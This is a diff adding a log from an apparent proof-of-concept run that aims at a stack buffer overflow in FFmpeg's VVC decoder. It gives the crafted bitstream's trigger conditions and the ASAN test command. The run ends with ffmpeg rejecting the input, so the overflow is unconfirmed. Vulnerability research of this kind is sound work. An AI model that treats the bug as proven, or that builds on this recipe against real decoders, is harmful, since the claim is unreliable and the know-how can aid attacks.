@@ -1,0 +1,74 @@
+=== VULN_001 PoC: Stack Buffer Overflow in matrix_mul() ===
+=== Target: libavcodec/vvc/itx_1d.c lines 644-661       ===
+
+[*] Working directory: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_vvc_itx_1d_c
+[*] FFmpeg binary: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
+[*] Input file: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_vvc_itx_1d_c/vuln_001_input.vvc
+
+[*] Generating crafted VVC bitstream...
+[+] Generated: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_vvc_itx_1d_c/vuln_001_input.vvc
+[+] Total file size: 810 bytes
+[+] SPS RBSP: 15 bytes
+[+] PPS RBSP: 8 bytes
+[+] Slice RBSP+CABAC: 514 bytes
+
+[*] Trigger conditions attempted:
+    sps_mts_enabled_flag               = 1
+    sps_explicit_mts_intra_enabled_flag = 1
+    sps_sbt_enabled_flag               = 0  (non-SBT path)
+    Picture: 32x32 (1 CTU = 1 CU of 32x32)
+    min_qt_intra = 32 (no QT splits)
+    max_mtt_depth_intra = 0 (no BT/TT splits)
+    CABAC data: 512 bytes of 0x00
+
+[*] Expected CABAC with QP=26, init_type=0 (I-slice):
+    cu_coded_flag (init=6, MPS=1)      → 1 (CU coded)
+    mts_idx[0]    (init=29, MPS=1)     → 1 (continue)
+    mts_idx[1]    (init=0, MPS=0)      → 0 (return 1 = DST7)
+    last_sig_x prefix=8, suffix=0      → last_sig_coeff_x = 16
+    → nzw = 17 > 16 → matrix_mul tmp[16] overflow attempted
+
+[!] Note: mts_zero_out_sig_coeff_flag may be cleared by
+    the last_sub_block at xs=4 (x>=16), preventing mts_idx
+    decode and defaulting to DCT2. Run to confirm behavior.
+
+[*] Input file size: 810 bytes
+
+[*] Running ASAN-instrumented FFmpeg...
+[*] Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f vvc -i /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_vvc_itx_1d_c/vuln_001_input.vvc -f null -
+
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[vvc @ 0x519000000580] Failed to read unit 2 (type 7): Invalid data found when processing input.
+[vvc @ 0x519000000580] Failed to parse picture unit.
+[in#0/vvc @ 0x517000000080] Could not find codec parameters for stream 0 (Video: vvc, none): unspecified size
+Consider increasing the value for the 'analyzeduration' (0) and 'probesize' (5000000) options
+Input #0, vvc, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_vvc_itx_1d_c/vuln_001_input.vvc':
+  Duration: N/A, bitrate: N/A
+  Stream #0:0: Video: vvc, none, 25 fps, 1200k tbr, 1200k tbn
+Stream mapping:
+  Stream #0:0 -> #0:0 (vvc (native) -> wrapped_avframe (native))
+Press [q] to stop, [?] for help
+[vf#0:0 @ 0x51a000000080] Cannot determine format of input 0:0 after EOF
+[vf#0:0 @ 0x51a000000080] Task finished with error: Invalid data found when processing input
+[vf#0:0 @ 0x51a000000080] Terminating thread with error: Invalid data found when processing input
+[vost#0:0/wrapped_avframe @ 0x517000000780] [enc:wrapped_avframe @ 0x5110000039c0] Could not open encoder before EOF
+[vost#0:0/wrapped_avframe @ 0x517000000780] Task finished with error: Invalid argument
+[vost#0:0/wrapped_avframe @ 0x517000000780] Terminating thread with error: Invalid argument
+[out#0/null @ 0x5110000034c0] Nothing was written into output file, because at least one of its streams received no packets.
+frame=    0 fps=0.0 q=0.0 Lsize=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+Conversion failed!
+
+[*] FFmpeg exit code: 183
+[!] FFmpeg exited with non-zero code: 183
+
+=== Run complete ===
+EXIT=0
